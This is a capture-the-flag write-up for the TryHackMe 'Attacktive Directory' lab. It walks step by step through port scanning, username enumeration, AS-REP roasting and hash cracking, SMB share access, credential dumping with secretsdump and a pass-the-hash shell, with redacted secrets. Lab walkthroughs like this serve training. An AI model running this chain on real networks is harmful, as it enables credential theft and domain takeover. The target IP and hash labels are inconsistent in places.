# Attacktive Directory - TryHackMe

## Informations

* **Machine:** AttacktiveDirectory
* **IP Adress:** 10.10.200.192

---

## nmap

**Bash**
```
nmap -sS -p- -Pn -T4 <IP>
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-01 10:03 EDT
Nmap scan report for 10.10.202.192
Host is up (0.062s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49679/tcp open  unknown
49683/tcp open  unknown
49701/tcp open  unknown
49830/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 265.32 seconds

```

## enum4linux

**Bash**
```
enum4linux -a <IP>
```

**Output:**

Domain Name: **THM-AD**

## kerbrute

**Bash**
```
./kerbrute userenum -d THM-AD users.txt --dc 10.10.200.192
```

**Found:**

```
2025/08/01 10:11:26 >  [+] VALID USERNAME:       james@THM-AD
2025/08/01 10:11:27 >  [+] VALID USERNAME:       svc-admin@THM-AD           //(HERE)
2025/08/01 10:11:28 >  [+] VALID USERNAME:       James@THM-AD
2025/08/01 10:11:29 >  [+] VALID USERNAME:       robin@THM-AD
2025/08/01 10:11:35 >  [+] VALID USERNAME:       darkstar@THM-AD
2025/08/01 10:11:41 >  [+] VALID USERNAME:       administrator@THM-AD
2025/08/01 10:11:51 >  [+] VALID USERNAME:       backup@THM-AD              //(HERE)
2025/08/01 10:11:56 >  [+] VALID USERNAME:       paradox@THM-AD
```

## AS-REP Roasting

**Bash**
```
python3 GetNPUsers THM-AD/svc-admin -no-pass -dc-ip 10.10.200.192
```

**Found:**

* **svc-admin@THM-AD: <NTLM_Hash>**

## Decoding Hash

**Bash**
```
john --format=krb5asrep ntlmhash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

**Output:**

"<password>    ($krb5asrep$23$svc-admin@THM-AD)"

## Access to SMBClient

**Bash**
```
smbclient -L \\10.10.200.192 -U svc-admin
Enter the Pass: <password>
```

**Output**
```
Sharename      Type      Content
---------      ----      -------
ADMIN$
backup
C$
...
```

## Learn to Content of backup File

**Bash**
```
smbclient //10.10.200.192/backup -U svc-admin
Enter the Pass: <password>

ls
```

**Output**

```
backup_credentials.txt      A      48
```

**Bash**
```
get backup_credentials.txt
CTRL+C
cat backup_credentials.txt
```

**Output**

* **<base64_hash>**

## Decoding Hash

**Bash**
```
base64 -d backup_credentials.txt
```

**Output:**
                  
`backup@spookysec.local:<password>`

## Accessable User's Hashes

```
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:<password>@10.10.202.192
```

**Output:**

```
Administrator:500:<LM_Hash>:<NTLM_Hash>
```

## Pass The Hash Attack

```
python3 wmiexec.py 'spookysec.local/Administrator@10.10.202.192' -hashes :<Administrator_NTLM_Hash>
```

**Now you can capture the flags.**

use : "dir", "cd" and "cat" commands.









